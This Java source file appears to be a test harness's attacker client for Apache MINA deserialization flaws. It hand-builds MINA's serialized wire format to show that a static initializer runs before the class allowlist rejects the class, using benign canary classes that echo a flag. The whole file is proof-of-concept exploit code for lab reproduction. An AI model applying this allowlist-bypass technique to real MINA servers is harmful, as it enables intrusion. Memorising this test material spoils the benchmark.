import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

/**
 * EXTERNAL TCP client (attacker peer) for apache-mina-cve-2026-42778. A SEPARATE process, in a SEPARATE
 * container, connecting to the REAL MINA server over a real TCP socket -- the genuine external network
 * trigger, the way MINA is actually used.
 *
 * It hand-builds the exact wire the MINA ObjectSerializationDecoder / AbstractIoBuffer.getObject() reads:
 * a 4-byte big-endian length prefix (MINA's getInt()) followed by a Java serialization stream whose
 * per-descriptor MINA TYPE byte matches MINA's own putObject() (type 1 + writeUTF(name) for a
 * Serializable class). Pure java.io -- no MINA on the client, and the client NEVER holds the ${PCB_FLAG}
 * canary: the payload carries only the class name + descriptor (PcbSeed.flag is transient; PcbCanary has
 * no fields). The flag is read only SERVER-side (PcbSeed.readObject or PcbCanary's static initializer),
 * then echoed back over this socket.
 *
 * Both attacker modes use the NORMAL MINA type-1 wire encoding; the differential here is which CLASS is
 * sent (readObject flag vs static-initializer flag), NOT the wire encoding.
 *
 *   seed     = the CVE-2024-52046 SEED: PcbSeed (flag read only in readObject, i.e. full reconstruction).
 *              -> reaches on V0; BLOCKED on V1 (allowlist rejects before construction).
 *   canary   = the CVE-2026-42778 RESIDUAL: PcbCanary (flag read in a STATIC INITIALIZER, i.e. at
 *              class resolution). -> REACHES on V1 (static init runs during Class.forName(name,true)
 *              before the allowlist rejects the class); BLOCKED on V2 (allowlist checked first).
 *   expected = the legit allowlisted PcbExpected (control: passes on V1/V2; proves allowlist is live).
 *
 * args: [host] [port] [mode]
 */
public class Client {

    /** Serialize `obj` with MINA's normal per-class descriptor encoding: type 1 + writeUTF(name) for a
     *  Serializable class (byte-identical to what IoBuffer.putObject() emits), type 0 + full descriptor
     *  otherwise. */
    static byte[] body(Serializable obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos) {
            @Override
            protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException {
                Class<?> clazz = desc.forClass();
                if (clazz.isArray() || clazz.isPrimitive() || !Serializable.class.isAssignableFrom(clazz)) {
                    write(0);
                    super.writeClassDescriptor(desc);
                } else {
                    write(1);                         // MINA type-1 marker for a Serializable class
                    writeUTF(desc.getName());
                }
            }
        };
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return bos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 9009;
        String mode = args.length > 2 ? args[2] : "seed";

        Serializable obj;
        switch (mode) {
            case "seed":     obj = new PcbSeed();     break; // original seed (readObject flag channel)
            case "canary":   obj = new PcbCanary();   break; // residual (static-initializer flag channel)
            case "expected": obj = new PcbExpected(); break; // legit control
            default: throw new IllegalArgumentException("mode: " + mode);
        }

        byte[] body = body(obj);

        String txt = "";
        try (Socket s = new Socket(host, port)) {
            s.setSoTimeout(8000);
            OutputStream os = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);
            dos.writeInt(body.length);   // 4-byte big-endian length prefix == MINA getInt()
            dos.write(body);
            dos.flush();

            InputStream is = s.getInputStream();
            ByteArrayOutputStream resp = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            try {
                while ((n = is.read(buf)) > 0) {
                    resp.write(buf, 0, n);
                }
            } catch (Exception readEnd) {
                /* soTimeout / server closed -> done reading */
            }
            // The server echoes a serialized String; the flag token appears in cleartext within it.
            txt = new String(resp.toByteArray(), StandardCharsets.ISO_8859_1).replaceAll("[\\r\\n]", " ");
        }

        System.out.println("CLIENT_MODE=" + mode);
        System.out.println("CLIENT_RESP=" + txt);
    }
}
